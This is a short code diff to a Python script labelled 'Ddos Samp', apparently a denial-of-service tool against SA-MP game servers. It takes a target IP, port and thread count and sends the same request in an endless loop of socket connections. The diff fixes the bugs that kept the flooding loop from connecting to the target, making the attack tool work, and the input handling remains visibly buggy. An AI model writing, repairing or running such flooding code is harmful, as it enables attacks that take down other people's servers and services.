@@ -5,7 +5,7 @@ import socket
 import random, requests
  
 print("Ddos Samp | 2023 | time:274.180day |")
-ip = int(input("Ip>>"))
+ip = str(input("Ip>>"))
 ip = int(input("Port/t>>"))
 th = int(input("Thread/t>>"))
 
@@ -60,7 +60,7 @@ def start2():
   while True:
         try:
           s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-          s.connect((str(int),int(port)))
+          s.connect((str(ip),int(port)))
           s.send(request)
           s.send(request)
           s.send(request)
